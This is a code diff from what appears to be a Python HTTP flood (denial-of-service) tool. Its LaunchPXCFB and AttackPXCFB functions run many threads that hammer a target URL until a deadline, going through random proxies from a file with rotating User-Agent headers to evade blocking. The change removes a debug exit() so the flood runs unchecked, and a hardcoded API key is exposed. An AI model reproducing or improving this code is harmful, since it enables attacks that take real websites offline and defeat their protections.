@@ -528,38 +528,40 @@ def LaunchPXCFB(url, th, t):
     'api_key': 'ef9e368b1b69cadb030fa20473ccd0c4'
 
     })
-    for _ in range(int(th)):
-        try:
-            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
-            thd.start()
-        except:
-            pass
+    if get_proxies():
+        proxies = open("./proxy.txt", 'r').read().split('\n')
+        
+        for _ in range(int(th)):
+            try:
+                thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper,proxies))
+                thd.start()
+            except:
+                pass
 
-def AttackPXCFB(url, until_datetime, scraper):
+def AttackPXCFB(url, until_datetime, scraper,proxies):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            if get_proxies():
-                proxies = open("./proxy.txt", 'r').read().split('\n')
 
-                proxy = random.choice(proxies).strip().split(":")
-               
-                proxy_url = f"http://{proxy[0]}:{proxy[1]}"
-                
-                # proxy_url = f"http://{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}"
-                proxies = {
-                'http': proxy_url,
-                'https': proxy_url,
+            for _ in range(50):
+                if proxies:
+                    proxy = random.choice(proxies).strip().split(":")
+                    proxy_url = f"http://{proxy[0]}:{proxy[1]}"
+                    print(proxy_url+'----proxy-url')
+                    proxies = {
+                        'http': proxy_url,
+                        'https': proxy_url,
 
-                }
-           
-                response = scraper.get(url, proxies=proxies)
-                print(response.status_code,proxy_url)
-                exit()
-                for _ in range(50):
+                     }
+                    headers = {
+                    'User-Agent': random.choice(ua),
+
+                    }
+
                     response = scraper.get(url,headers=headers, proxies=proxies)
                     print(response.status_code,proxy_url)
-                    time.sleep(1)
-               
+
+                else:
+                    print('proxy rỗng')
         except Exception as e:
             print('falid--------------',e)
             pass
